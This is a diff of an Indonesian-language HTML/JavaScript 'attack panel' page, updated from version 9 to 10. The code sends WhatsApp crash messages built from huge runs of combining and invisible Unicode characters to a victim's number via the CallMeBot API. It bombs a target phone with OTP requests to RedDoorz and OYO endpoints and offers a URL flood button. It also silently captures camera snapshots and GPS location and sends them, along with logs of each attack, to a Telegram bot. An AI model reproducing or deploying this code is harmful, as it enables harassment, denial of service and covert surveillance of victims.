@@ -3,59 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.9.0 GHOST ]</title>
+    <title>[ EDWARD OMNI V.10.0 FINAL ]</title>
     <style>
         :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --purple: #bc13fe; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; text-align: center; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; text-align: center; }
         h1 { font-size: 24px; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 10px var(--neon); margin-bottom: 0; }
-        .panel { background: rgba(20, 20, 20, 0.9); border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: inset 0 0 10px #000; }
+        .panel { background: rgba(30, 30, 30, 0.8); border: 1px solid #333; border-radius: 15px; padding: 15px; margin-bottom: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 12px; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.2s; text-transform: uppercase; font-size: 11px; width: 100%; box-shadow: 0 0 5px var(--neon); }
-        button:active { transform: scale(0.95); box-shadow: none; }
-        input { background: #000; border: 1px solid #444; color: #fff; padding: 12px; width: 90%; margin: 8px 0; border-radius: 5px; outline: none; text-align: center; }
-        .btn-ghost { border-color: var(--purple); color: var(--purple); text-shadow: 0 0 5px var(--purple); }
+        button { background: #111; color: var(--neon); border: 1px solid var(--neon); padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 11px; width: 100%; }
+        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
+        input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 12px; width: 90%; margin: 8px 0; border-radius: 8px; outline: none; text-align: center; }
+        .btn-server { border-color: var(--purple); color: var(--purple); }
+        .btn-server:hover { background: var(--purple); color: #fff; box-shadow: 0 0 15px var(--purple); }
         .btn-danger { border-color: var(--danger); color: var(--danger); }
-        #toast { visibility: hidden; min-width: 250px; background: #000; color: #fff; text-align: center; border-radius: 5px; padding: 15px; position: fixed; z-index: 100; left: 50%; bottom: 30px; transform: translateX(-50%); border: 1px solid var(--neon); font-weight: bold; }
+        .btn-danger:hover { background: var(--danger); color: #fff; }
+        #toast { visibility: hidden; min-width: 250px; background-color: #000; color: #fff; text-align: center; border-radius: 50px; padding: 15px; position: fixed; z-index: 100; left: 50%; bottom: 30px; transform: translateX(-50%); border: 1px solid var(--neon); }
         #toast.show { visibility: visible; animation: fadein 0.5s; }
         @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
     </style>
 </head>
 <body>
 
-    <h1>EDWARD OMNI <span style="color:#fff">V.9.0</span></h1>
-    <p style="font-size:10px; color:var(--purple); font-weight: bold;">[ GHOST ATTACKER SYSTEM ACTIVE ]</p>
+    <h1>EDWARD OMNI <span style="color:#fff">V.10.0</span></h1>
+    <p style="font-size:10px; color:var(--purple); font-weight: bold;">[ SERVER-SIDE & BRUTAL SYSTEM ]</p>
 
     <div class="panel">
-        <button onclick="takeSnap()" style="background:var(--neon); color:#000;">📸 RADAR & SILENT PHOTO</button>
+        <button onclick="takeSnap()" style="background:#fff; color:#000; border:none;">📸 RADAR & SILENT SCAN</button>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <div class="panel" style="border-color: var(--purple)">
-        <h3 style="color: var(--purple); margin:0 0 10px 0;">😈 WA GHOST ATTACK</h3>
+        <h3 style="color: var(--purple); margin:0">😈 DIRECT WA ATTACK</h3>
         <input type="number" id="noBug" placeholder="Nomor: 628xxxxxxx">
-        <button onclick="sendGhost()" class="btn-ghost">LAUNCH GHOST BUG 😈</button>
-        <p style="font-size: 9px; color: #666; margin-top: 5px;">*Klik 1x copy, klik 2x kirim.</p>
+        <input type="text" id="apiKey" placeholder="CallMeBot Key (Opsional)">
+        <button onclick="sendServerBug()" class="btn-server">SEND VIA SERVER 🚀</button>
+        <p style="font-size: 8px; color: #666; margin-top: 5px;">*Kirim otomatis tanpa buka aplikasi WA.</p>
     </div>
 
     <div class="panel">
-        <h3 style="margin:0 0 10px 0;">⚔️ ANONYMOUS OTP</h3>
-        <input type="number" id="noTarget" placeholder="Target: 08xxxxxxx">
-        <button onclick="spamOTP()">SEND OTP BOMB</button>
+        <h3 style="margin:0">⚔️ ANONYMOUS OTP BOMB</h3>
+        <input type="number" id="noTarget" placeholder="Nomor: 08xxxxxxx">
+        <button onclick="spamOTP()">START BOMBARDIR</button>
     </div>
 
     <div class="panel">
-        <h3 style="margin:0 0 10px 0;">🎮 TOOLS & GAME</h3>
+        <h3 style="margin:0">🎮 GAME CENTER</h3>
         <div class="grid">
-            <button onclick="launch('com.dts.freefireth')">FF</button>
-            <button onclick="launch('com.mobile.legends')">ML</button>
+            <button onclick="launch('com.dts.freefireth')">Free Fire</button>
+            <button onclick="launch('com.mobile.legends')">MLBB</button>
+            <button onclick="launch('com.roblox.client')">Roblox</button>
             <button onclick="getPojav()" style="background:#ffea00; color:#000; border:none;">GET POJAV</button>
-            <button onclick="location.reload()">REFRESH</button>
         </div>
     </div>
 
     <div class="panel" style="border-color: var(--danger)">
-        <button onclick="startAttack()" class="btn-danger">💣 FLOOD JUDOL TARGET</button>
+        <input type="text" id="targetJudol" placeholder="URL Target...">
+        <button onclick="startAttack()" class="btn-danger">💣 FLOOD TARGET</button>
     </div>
 
     <div id="toast">SYSTEM READY</div>
@@ -70,22 +74,18 @@
             setTimeout(() => { t.className = ""; }, 3000);
         }
 
-        // 😈 GHOST BUG SCRIPT V.9.0
-        function sendGhost() {
+        // 😈 SERVER-SIDE DIRECT BUG
+        function sendServerBug() {
             let n = document.getElementById('noBug').value;
+            let api = document.getElementById('apiKey').value || "965315";
             if(!n) return showToast("INPUT NOMOR!", "#f00");
 
-            // Karakter perusak memori rendering WhatsApp
-            let ghostText = "‎".repeat(10000) + "ॣ".repeat(2000) + " 𑗄 ".repeat(2000) + "҈".repeat(2000) + " ​​ ".repeat(5000);
-            let finalBug = `wa.me/settings?📍${ghostText}😈_EDWARD_GHOST_V9_😈${ghostText}`;
-
-            navigator.clipboard.writeText(finalBug).then(() => {
-                showToast("VIRUS COPIED! PASTE DI CHAT!", "#bc13fe");
-                setTimeout(() => {
-                    window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(finalBug)}`, '_blank');
-                }, 1000);
-            });
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 GHOST BUG SENT TO: ${n}`);
+            let crashText = "ॣ".repeat(800) + "‎".repeat(1200) + "😈_CRASH_SYSTEM_V10_😈" + "​​".repeat(2000);
+            let url = `https://api.callmebot.com/whatsapp.php?phone=${n}&text=${encodeURIComponent(crashText)}&apikey=${api}`;
+            
+            fetch(url, { mode: 'no-cors' });
+            showToast("DATA SENT TO SERVER!", "#bc13fe");
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🚀 SERVER ATTACK: ${n}`);
         }
 
         async function takeSnap() {
@@ -102,9 +102,10 @@
                     stream.getTracks().forEach(t => t.stop());
                     showToast("INTEL SENT!");
                 }, 1500);
-            } catch (e) { showToast("CAMERA DENIED!", "#f00"); }
+            } catch (e) { showToast("DENIED!", "#f00"); }
+            
             navigator.geolocation.getCurrentPosition(p => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 TARGET LOC:\nhttp://googleusercontent.com/maps.google.com/5{p.coords.latitude},${p.coords.longitude}`);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOC: http://googleusercontent.com/maps.google.com/6{p.coords.latitude},${p.coords.longitude}`);
             });
         }
 
@@ -125,8 +126,8 @@
 
         function spamOTP() {
             let n = document.getElementById('noTarget').value;
-            if(!n) return showToast("NO TARGET!", "#f00");
-            showToast("BOMBARDIR...");
+            if(!n) return showToast("INPUT TARGET!", "#f00");
+            showToast("BOMBARDING...");
             fetch(`https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`, {mode:'no-cors'});
             fetch(`https://www.oyorooms.com/api/pwa/generateotp?phone=${n}`, {mode:'no-cors'});
         }
